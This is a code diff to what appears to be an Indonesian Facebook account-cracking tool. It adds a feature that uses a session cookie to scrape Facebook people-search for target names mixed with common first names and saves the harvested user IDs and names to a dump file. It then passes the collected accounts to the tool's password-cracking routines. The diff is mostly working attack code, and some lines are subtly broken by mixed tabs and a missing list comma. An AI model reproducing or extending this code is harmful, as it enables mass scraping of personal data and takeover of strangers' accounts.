@@ -660,7 +660,7 @@ def pilih_menu():
     dc = input('   %s└──> %s'%(A,J))
     if dc in ['1','01','a']    : gabung_sandi.append(Author);not_availablell('Dump ID Dari Friendlist')
     elif dc in ['2','02','b']  : tempel_sandi.append('Jangan');main_folls();system_login();urut_crack();pilihan_sakdurunge_crack();addpass();crack()
-    elif dc in ['3','03','c']  : gabung_sandi.append('Direcode');not_availablell('Dump ID Dari Nama')
+    elif dc in ['3','03','c']  : gabung_sandi.append('Direcode');namee()
     elif dc in ['4','04','d']  : tempel_sandi.append('Dasar');main_likers();system_login();pilihan_sakdurunge_crack();addpass();crack()
     elif dc in ['5','05','e']  : gabung_sandi.append('Bocah');not_availablell('Dump ID Dari Pesan')
     elif dc in ['6','06','f']  : tempel_sandi.append('Goblok');komen();system_login();pilihan_sakdurunge_crack();addpass();crack()
@@ -855,6 +855,77 @@ def exec_folls(url,token,file):
         except KeyboardInterrupt:pass
         except (IndexError,TypeError,IOError,KeyError,AttributeError):pass
 
+###----------[ DUMP ID NAME ]---------- ###
+class namee:
+    def __init__(self):
+        global file_dump, urutan_crack
+        urutan_crack = '0'
+        try:cookie = {'cookie':open('login/cookie.json','r').read()}
+        except Exception as e:kecuali(e)
+        print('       %s[%s•%s] %sContoh : dapunta,denventa,anita'%(J,P,J,P))
+        put = input('       %s[%s•%s] %sNama Target : %s'%(J,P,J,P,J)).split(',')
+        data = []
+        self.file_dump = ('dump/%s.json'%(put[0]))
+        file_dump = self.file_dump
+        open(self.file_dump,'w').write('')
+        common = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko'" iqbal"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," hendrik"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa","galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","naira ","mancung ","dewi ","josen ","johan ","slot ","sharil ","hendrik ","edo ","ridho ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
+        custom = [" iqbal"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," hendrik"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
+	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","naira ","mancung ","dewi ","josen ","johan ","slot ","sharil ","hendrik ","edo ","ridho ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
+	for set1 in put:
+            data.append(set1)
+            for set2 in common:data.append(set2+' '+set1)
+        for set3 in data:url = 'https://mbasic.facebook.com/search/people/?q='+set3;self.exec(url,cookie)
+        self.lanjut()
+    def exec(self,url,cookie):
+        try:
+            with requests.Session() as xyz:
+                req = xyz.get(url,cookies=cookie)
+                pra = par(req.content,'html.parser')
+                spam = pra.find_all('h2')[0]
+                if 'Anda Diblokir Sementara' in spam.text:print("\r       %s[%s•%s] %sAkun Anda Terkena Spam %s!%s"%(M,P,M,P,M,P), end='');sys.stdout.flush()
+                else:print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P), end='');sys.stdout.flush()
+                for temu in pra.find_all('a',href=True):
+                    if "<img alt=" in str(temu):
+                        if "home.php" in str(temu["href"]):continue
+                        else:
+                            try:
+                                if 'profile.php' in str(temu["href"]):
+                                    find = re.findall('"/profile\.php\?id=(.*?)&"',str(temu))[0]
+                                    if len(find) !=0:
+                                        id   = ''.join(find)
+                                        nama = temu.find("img").get("alt").replace(", profile picture","")
+                                        file = open(self.file_dump,'r').read()
+                                        if len(gabung_sandi) != 1:
+                                            for x in range(Postingan):
+                                                open(file_dump,'a+').write('dev\n')
+                                        else:
+                                            if id in file:continue
+                                            else:open(self.file_dump,'a+').write('%s=%s\n'%(id,nama))
+                                elif 'refid' in str(temu["href"]):
+                                    find = re.findall("/(.*?)\?",str(temu))[0]
+                                    if len(find) !=0:
+                                        id   = convert_id(''.join(find))
+                                        kat  = id.split('.')[0] + '.' + id.split('.')[1]
+                                        nama = temu.find("img").get("alt").replace(", profile picture","")
+                                        file = open(self.file_dump,'r').read()
+                                        if len(gabung_sandi) != 1:
+                                            for x in range(Postingan):
+                                                open(file_dump,'a+').write('dev\n')
+                                        else:
+                                            if id in file:continue
+                                            else:
+                                                if kat in file:continue
+                                                else:open(self.file_dump,'a+').write('%s=%s\n'%(id,nama))
+                            except (IndexError,ValueError,IOError):continue
+                            except KeyboardInterrupt:exit(self.lanjut())
+                for tamu in pra.find_all('a',href=True):
+                    if 'Lihat Hasil Selanjutnya' in tamu.text:new_url = tamu['href'];self.exec(new_url,cookie)
+        except KeyboardInterrupt:exit(self.lanjut())
+    def lanjut(self):
+        print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P))
+        print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
+        system_login();pilihan_sakdurunge_crack();addpass();crack()
+	
 ###----------[ DUMP ID LIKERS ]---------- ###
 def main_likers():
     global _react_type_, file_dump, urutan_crack
